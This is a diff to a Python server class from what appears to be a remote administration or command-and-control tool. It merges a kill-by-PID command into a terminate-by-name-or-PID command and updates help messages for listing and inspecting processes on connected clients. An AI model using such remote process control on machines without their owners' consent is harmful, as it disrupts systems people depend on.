@@ -28,7 +28,7 @@ class Server(object):
 
     def __repr__(self):
         print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')
-        
+
     # kills some processes by name
     def terminateProcess(self, processname):
         if processname and self.userAttached:
@@ -42,27 +42,8 @@ class Server(object):
                 printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                 self.removecurrentSession() # removing the current session because connection probaly was lost
         else:
-            printr('Info: Kills some process running by name. | Ex: [green]/terminateprocess windowsexplorer.exe')
+            printr('Info: Kills some process running by name or PID. | Ex: [green]/terminateprocess windowsexplorer.exe [yellow]or[green] /terminateprocess 3123')
 
-    # kills some process by pid
-    def killProcess(self, pid):
-        if pid and self.userAttached:
-            try:
-                int(pid)
-                connection = self.getCurrentUser()['conn']
-                connection.send(self.lastCommand.encode())
-                try:
-                    header = self.receiveHeader(connection)
-                    printr(header['content'])
-                    
-                except EOFError:
-                    printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
-                    self.removecurrentSession() # removing the current session because connection probaly was lost
-            except ValueError:
-                printr(f'[red]Error, parameter [yellow]PID [red]must be a integer')
-        else:
-            printr('Info: Kills some process running by PID | Ex: [green]/killprocess 5003')
-    
     # getting info of only one process
     def getProcessInfo(self, processname):
         if processname and self.userAttached:
@@ -88,7 +69,7 @@ class Server(object):
                 printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                 self.removecurrentSession() # removing the current session because connection probaly was lost
         else:
-            printr('Info: Shows basic information of only one process running on the client side')
+            printr('Info: Shows basic information of only one process running on the client side. | Ex: [green]/processinfo windowsexplorer.exe [yellow]or[green] /processinfo 3123')
 
     # getting all processes running in client side
     def getProcessList(self, args):
@@ -391,7 +372,6 @@ class Server(object):
             "/processlist": {"local": False, "action": self.getProcessList},
             "/processinfo": {"local": False, "action": self.getProcessInfo},
             "/terminateprocess": {"action": self.terminateProcess},
-            "/killprocess": {"action": self.killProcess},
             "/author": {"local": True, "action": self.showCodeAuthor},
             "/contact": {"local": True, "action": self.showContact},
             "/version": {"local": True, "action": self.showVersion},
